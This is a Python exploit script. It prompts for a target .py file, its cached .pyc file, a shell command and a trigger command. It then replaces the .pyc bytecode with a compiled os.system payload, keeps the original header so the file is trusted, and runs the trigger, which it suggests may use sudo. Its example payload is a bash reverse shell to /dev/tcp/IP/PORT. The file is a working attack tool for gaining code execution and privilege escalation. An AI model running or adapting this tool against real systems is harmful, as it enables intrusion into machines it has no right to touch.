#!/usr/bin/env python3
import re
import struct
import time
import marshal
import os
import sys

FIELD_SIZE = 4

def escape_command(cmd):
    """Escape command for Python string literal"""
    cmd = cmd.replace('\\', '\\\\')
    cmd = cmd.replace("'", "\\'")
    return cmd

def modifyBytecode(bytecode, rce_code, bytecode_filename):
    """Modify bytecode with custom RCE payload"""
    headers = bytecode[0:16]
    magicNumber, bitField, modDate, sourceSize = [headers[i:i + FIELD_SIZE] for i in range(0, len(headers), FIELD_SIZE)]

    modTime = time.asctime(time.localtime(struct.unpack("=L", modDate)[0]))
    unpackedSourceSize = struct.unpack("=L", sourceSize)[0]

    print(f'[*] Magic number: {magicNumber}')
    print(f'[*] Bit field: {bitField}')
    print(f'[*] Source modification time: {modTime}')
    print(f'[*] Source file size: {unpackedSourceSize}')

    codeObject = compile(rce_code, bytecode_filename, 'exec')
    codeBytes = marshal.dumps(codeObject)

    newBytecode = magicNumber + bitField + modDate + sourceSize + codeBytes
    return newBytecode

def read_file(filename):
    """Read binary file content"""
    with open(filename, 'rb') as file:
        return file.read()

def create_RCE_file(filename, fileContent):
    """Create temporary file with modified bytecode"""
    with open(filename + '.tmp', 'wb') as file:
        file.write(fileContent)

def replace_file(originalFilename):
    """Replace original file with modified one"""
    os.remove(originalFilename)
    os.rename(originalFilename + '.tmp', originalFilename)

def trigger_RCE(trigger_command):
    """Execute the trigger command"""
    print(f'[*] Executing: {trigger_command}')
    os.system(trigger_command)

def interactive_mode():
    """Interactive CLI mode"""
    print("=" * 60)
    print("Python Dirty Arbitrary File Write to RCE via Overwriting Bytecode Files (.pyc)")
    print("IMPORTANT note: this script requires knowledge of the FULL PATH to the target .py and corresponding .pyc file and its CPython version.")
    print("=" * 60)
    print()

    target_script = input("[?] Target Python script (e.g., /path/script.py): ").strip()
    pyc_file = input("[?] .pyc file to modify (e.g., /path/__pycache__/file.cpython-311.pyc): ").strip()

    cpython_version = '313'  # default value
    # Try to auto-detect version from filename
    match = re.search(r'cpython-(\d+)', pyc_file) 
    if match and match.group(1):
        cpython_version = match.group(1)
        print(f"[i] CPython version detected automatically: {cpython_version}") 
    else:
        cpython_version = input("[?] CPython version (e.g., 311, 39, 310): ").strip()

    print()
    print("[!] Insert the RCE command (it will be automatically escaped)")
    print("    Example: bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")
    rce_command = input("[?] RCE command: ").strip()

    trigger_cmd = input("[?] Command to trigger RCE (e.g., (sudo) /path/script.py): ").strip()

    return {
        'target_script': target_script,
        'pyc_file': pyc_file,
        'cpython_version': cpython_version,
        'rce_command': rce_command,
        'trigger_command': trigger_cmd
    }

def main():
    # Get parameters from interactive mode
    params = interactive_mode()

    # Validate files exist
    if not os.path.exists(params['pyc_file']):
        print(f"[-] Error: File {params['pyc_file']} not found!")
        sys.exit(1)

    # Escape the command
    escaped_command = escape_command(params['rce_command'])

    # Build the complete RCE source
    rce_source = f"__import__('os').system('{escaped_command}')"

    print()
    print("[*] Configuration:")
    print(f"    Target script: {params['target_script']}")
    print(f"    File .pyc: {params['pyc_file']}")
    print(f"    CPython version: {params['cpython_version']}")
    print(f"    Original command: {params['rce_command']}")
    print(f"    Escaped command: {escaped_command}")
    print(f"    RCE payload: {rce_source}")
    print(f"    Trigger command: {params['trigger_command']}")
    print()

    # Verify the RCE source is valid Python
    try:
        compile(rce_source, '<test>', 'exec')
        print("[+] RCE payload syntax validated successfully")
    except SyntaxError as e:
        print(f"[-] ERROR: RCE payload contains syntax errors!")
        print(f"    {e}")
        print()
        print("[!] Try:")
        print("    1. Using double quotes in the bash command")
        print("    2. Manually verify escaping")
        sys.exit(1)

    try:
        print('[*] Reading the bytecode file content...')
        originalBytecode = read_file(params['pyc_file'])

        print('[*] Modifying the bytecode with RCE payload...')
        newBytecode = modifyBytecode(originalBytecode, rce_source, params['target_script'])

        print('[*] Creating modified bytecode file...')
        create_RCE_file(params['pyc_file'], newBytecode)

        print('[*] Replacing original bytecode file...')
        replace_file(params['pyc_file'])

        print('[+] Bytecode successfully modified!')

        trigger_RCE(params['trigger_command'])

    except Exception as e:
        print(f'[-] Error: {e}')
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()